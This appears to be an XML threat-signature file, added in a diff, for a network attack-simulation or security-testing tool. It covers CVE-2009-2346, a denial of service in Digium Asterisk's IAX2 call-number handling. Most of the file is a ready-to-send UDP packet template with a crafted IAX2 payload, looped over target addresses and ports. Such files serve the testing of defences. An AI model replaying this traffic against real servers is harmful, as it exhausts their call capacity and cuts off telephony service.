@@ -1,0 +1,89 @@
+<?xml version="1.0" encoding="utf-8"?>
+<threatSignature>
+  <ThreatProperties>
+    <ExecDesc display="true" value="Digium Asterisk IAX2 Call Number Denial Of Service"/>
+    <EngDesc display="true" value="A resource exhaustion based denial of service vulnerability exists in Digium's Asterisk. The vulnerability is due to a design weakness in the way Asterisk associates messages with the calls they belong to. An unauthenticated, remote attacker can exploit this vulnerability by sending a large number of messages to a vulnerable system. Successful exploitation would exhaust the call number space, resulting in a denial of service condition."/>
+    <Intent display="true">
+      <item value="Denial_of_Service/Resource_Exhaustion"/>
+    </Intent>
+    <Protocol display="true" value="IAX2"/>
+    <Type_Of_Equipment display="true">
+      <item value="Server"/>
+    </Type_Of_Equipment>
+    <Known_Vendors_Affected display="true">
+      <item value="Digium"/>
+    </Known_Vendors_Affected>
+    <Known_Products_Affected display="true">
+      <item value="Digium_Asterisk"/>
+    </Known_Products_Affected>
+    <Known_Versions_Affected display="true">
+      <item value="Digium_Asterisk_Business_Edition_B.x.x&amp;C.x.x/Digium_Asterisk_Open_Source_1.2.x&amp;1.4.x&amp;1.6.x/Digium_s800i_1.3.x"/>
+    </Known_Versions_Affected>
+    <Credit display="true" value=""/>
+    <CVEID display="true" value="CVE-2009-2346"/>
+    <bugtraqID display="true" value=""/>
+    <OSVDB display="true" value=""/>
+    <Author display="true" value=""/>
+    <ID display="true" value="79a3137e84cec175179f04ab82808baa"/>
+    <Revision display="true" value="1"/>
+    <Safe display="true" value=""/>
+    <ServerSideAttack display="true" value=""/>
+    <SoftwareRevision display="true" value="2.0"/>
+    <Suite display="true" value="Standard"/>
+    <RunOnce display="false" value=""/>
+    <Valid_Traffic display="false" value=""/>
+    <AccessVector display="false" value="remote"/>
+    <AccessComplexity display="false" value="low"/>
+    <Authentication display="false" value="not-required"/>
+    <ConfImpact display="false" value="none"/>
+    <IntegImpact display="false" value="none"/>
+    <AvailImpact display="false" value="complete"/>
+    <ImpactBias display="false" value=""/>
+    <FirstAdded display="false" value=""/>
+    <LastModified display="false" value="633994987164793750"/>
+    <SigStyle display="false" value=""/>
+    <targetNode display="false" value=""/>
+    <SigProtocol display="false" value="UDP"/>
+    <Rate display="false" value=""/>
+    <Regex display="false" value=""/>
+    <Created value="1263897006" display="true"/>
+  </ThreatProperties>
+  <Variables>
+    <NamedVar name="destMAC" type="ImperfectControls.MacAddress" value="null" index="YFT"/>
+    <NamedVar name="destIP" type="ImperfectControls.IPv4Address" value="null" index="YFU"/>
+    <NamedVar name="IAX2destPort" type="ImperfectControls.Port" value="null" index="YFV"/>
+    <NamedVar name="sourceIP" type="ImperfectControls.IPv4Address" value="null" index="YFW"/>
+    <NamedVar name="IAX2sourcePort" type="ImperfectControls.Port" value="null" index="YFX"/>
+  </Variables>
+  <Loops>
+    <for index="A">
+      <for index="YFU"/>
+      <for index="YFT"/>
+      <for index="YFW"/>
+      <for index="YFX"/>
+      <for index="YFV"/>
+    </for>
+    <for index="B">
+      <for index="YFT"/>
+      <for index="YFW"/>
+      <for index="YFU"/>
+      <for index="YFX"/>
+      <for index="YFV"/>
+    </for>
+  </Loops>
+  <PostScript/>
+  <Output index="A" Count="">
+    <Ethernet srcMac="2:00:60:6f:95:c" destMac="$destMAC" pktType="0800">
+      <IP Version="04" InternetHeaderLength="05" TypeofService="00" TotalLength="002E" Identification="0000" FragmentOffset="0000" TTL="40" Protocol="11" HeaderChecksum="" srcIP="$sourceIP" destIP="$destIP" options="" CE="false" DF="true" MF="false">
+        <UDP srcPort="$IAX2sourcePort" destPort="$IAX2destPort" checksum="" length="001A" Payload="8000000000000001000006010100FFFFFFFF"/>
+      </IP>
+    </Ethernet>
+  </Output>
+  <Output index="B" Count="">
+    <Ethernet srcMac="2:00:60:6f:95:c" destMac="$destMAC" pktType="0800">
+      <IP Version="04" InternetHeaderLength="05" TypeofService="00" TotalLength="002E" Identification="0000" FragmentOffset="0000" TTL="40" Protocol="11" HeaderChecksum="" srcIP="$sourceIP" destIP="$destIP" options="" CE="false" DF="true" MF="false">
+        <UDP srcPort="$IAX2sourcePort" destPort="$IAX2destPort" checksum="" length="001A" Payload="8000000000000001000006010100FFFFFFFF"/>
+      </IP>
+    </Ethernet>
+  </Output>
+</threatSignature>
